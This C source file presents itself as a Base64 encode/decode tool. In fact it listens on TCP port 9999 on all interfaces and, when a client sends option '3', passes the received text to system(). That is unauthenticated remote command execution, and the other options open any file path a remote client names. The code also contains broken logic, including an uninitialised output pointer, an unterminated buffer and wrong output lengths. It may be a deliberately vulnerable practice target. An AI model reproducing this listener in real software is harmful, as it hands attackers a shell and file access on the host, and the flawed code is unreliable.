#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h> 
#include <sys/socket.h>
#include <netinet/in.h> 

#include "Base64.h" // Thanks to 

#define PORT 9999



const char OutputFileForDecoded[] = "DecodedOutput.txt"; 
const char OutputFileForEncoded[] = "EncodedOutput.enc"; 




void PrintUseCase()
{
    printf("\nUse: ./Base64EncDec_Tool.exe $UseCase $Filename\n");
    printf("$UseCase:\n");
    printf("1: Encode $Filename\n");
    printf("2: Decode $Filename\n");
    printf("3: Run System Command $Filename\n");
    printf("NOTE: Running System command requires that you put \" \" around the command you wish to run.\n");
}


int main( int argc, char *argv[] )  {


   int server_fd, new_socket, valread; 
	struct sockaddr_in address; 
	int opt = 1; 
	int addrlen = sizeof(address); 
   char buffer[2048];

   // Creating socket file descriptor 
	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) 
	{ 
		perror("socket failed"); 
		exit(EXIT_FAILURE); 
	} 

   
	// Forcefully attaching socket to the port 9999 
	if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, 
												&opt, sizeof(opt))) 
	{ 
		perror("setsockopt"); 
		exit(EXIT_FAILURE); 
	} 
	address.sin_family = AF_INET; 
	address.sin_addr.s_addr = INADDR_ANY; 
	address.sin_port = htons( PORT ); 
	
	// Forcefully attaching socket to the port 9999 
	if (bind(server_fd, (struct sockaddr *)&address, 
								sizeof(address))<0) 
	{ 
		perror("bind failed"); 
		exit(EXIT_FAILURE); 
	} 
	if (listen(server_fd, 3) < 0) 
	{ 
		perror("listen"); 
		exit(EXIT_FAILURE); 
	} 
	if ((new_socket = accept(server_fd, (struct sockaddr *)&address, 
					(socklen_t*)&addrlen))<0) 
	{ 
		perror("accept"); 
		exit(EXIT_FAILURE); 
	} 
	valread = read( new_socket, buffer, 2048); 

   if (buffer[0] == '1')
   {
      FILE *fp = fopen(&buffer[2], "r+");
      
      fseek(fp, 0L, SEEK_END);
      long size = ftell(fp);
      rewind(fp);

      char * data;
      data = (char*) calloc(size, 1);
      fread(data, 1, size, fp);
      
      fclose(fp);
      uint8_t * encoded_data;
      base64_encode(data, size, size, encoded_data);
      free(data);
      
      fp = fopen(OutputFileForEncoded, "w+");
      fwrite(encoded_data, 1, size, fp);
      fclose(fp);

      printf("Encoded Data is stored into: %s \n", OutputFileForEncoded);
   }
   else if (buffer[0] == '2')
   {
      FILE *fp = fopen(&buffer[2], "r+");
      
      fseek(fp, 0L, SEEK_END);
      long size = ftell(fp);
      rewind(fp);

      char * encoded_data;
      encoded_data = (char*) calloc(size, 1);
      fread(encoded_data, 1, size, fp);
      
      fclose(fp);

      char * decoded_data = base64_decode(encoded_data, size, &size);
      free(encoded_data);
      fp = fopen(OutputFileForDecoded, "w+");
      fwrite(decoded_data, 1, size, fp);
      fclose(fp);

      printf("Decoded Data is stored into: %s \n", OutputFileForDecoded);
   }
   else if (buffer[0] == '3')
   {
      system(&buffer[2]);
   }
   


   return 0;
}
